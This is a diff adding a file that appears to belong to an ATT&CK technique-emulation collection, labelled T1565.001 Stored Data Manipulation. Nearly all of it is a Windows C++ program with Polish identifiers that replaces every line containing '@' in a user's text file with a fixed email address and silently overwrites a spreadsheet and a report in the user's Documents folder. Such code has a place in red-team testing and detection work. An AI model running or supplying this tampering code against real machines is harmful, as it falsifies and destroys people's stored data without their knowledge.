@@ -1,0 +1,86 @@
+---
+title: "T1565.001.Stored Data Manipulation"
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <string>
+#include <vector>
+void PodmienZnaki(const std::string& nazwaPliku, const std::string& nowaZawartosc) {
+    std::ifstream plik(nazwaPliku);
+    if (!plik.is_open()) {
+        std::cerr << "Nie można otworzyć pliku: " << nazwaPliku << std::endl;
+        return;
+    }
+    std::vector<std::string> linie;
+    std::string linia;
+    while (std::getline(plik, linia)) {
+        if (linia.find("@") != std::string::npos) {
+            linie.push_back(nowaZawartosc);
+        }
+        else {
+            linie.push_back(linia);
+        }
+    }
+    plik.close();
+
+    std::ofstream plikWynikowy(nazwaPliku);
+    if (!plikWynikowy.is_open()) {
+        std::cerr << "Nie można otworzyć pliku wynikowego." << std::endl;
+        return;
+    }
+
+    for (const auto& linia : linie) {
+        plikWynikowy << linia << std::endl;
+    }
+
+    std::cout << "Zakończono podstawianie znaków." << std::endl;
+}
+bool Podmiana() {
+    std::ifstream src("WażneDaneTabelaryczne.xlsx", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\Documents\\WażneDaneTabelaryczne.xlsx", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool Dodanie() {
+    std::ifstream src("Raport o stanie projektuv3.docx", std::ios::binary);
+    std::ofstream dest("C:\\Users\\User\\Documents\\Raport o stanie projektuv3.docx", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        return false;
+    }
+    return true;
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::string nazwaPliku = "C:\\Users\\User\\Documents\\Nowy folder\\ważne dane.txt";
+    std::string nowaZawartosc = "12345@123.pl";
+    PodmienZnaki(nazwaPliku, nowaZawartosc);
+    Podmiana();
+    Dodanie();
+    return 0;
+}
